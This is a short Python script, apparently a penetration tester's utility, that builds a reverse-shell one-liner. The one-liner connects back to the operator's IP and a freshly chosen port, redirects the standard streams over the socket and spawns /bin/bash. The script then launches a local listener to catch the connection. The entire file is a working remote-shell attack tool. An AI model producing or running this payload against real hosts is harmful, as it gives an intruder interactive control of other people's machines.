#!python3
import os,socket,subprocess
raw = 'import socket,os,pty;s=socket.socket();s.connect(("$$IP",$$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("TERM","xterm-256color");os.putenv("ip","$$IP");os.putenv("COLUMNS","300");os.putenv("LINES","65");pty.spawn("/bin/bash")'

# Get free port
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('', 0))
port = s.getsockname()[1]

# Generate command to run on remote host
print("  !!! ENTER COMMAND BELOW ON REMOTE HOST TO REV-CONNECT TO THIS HOST !!!\n")
raw = raw.replace('$$IP', os.environ['lip'])
raw = raw.replace('$$PORT', str(port))
print('python -c \'' + raw + '\'')

# Generate and execute listener on local machine
command = '/root/scripts/tcp_pty_shell_handler.py -b 0.0.0.0:' + str(port)
print('\nListen for connection on port ' + os.environ['lip']  + ':' + str(port) )
s.close()
subprocess.run(command.split())
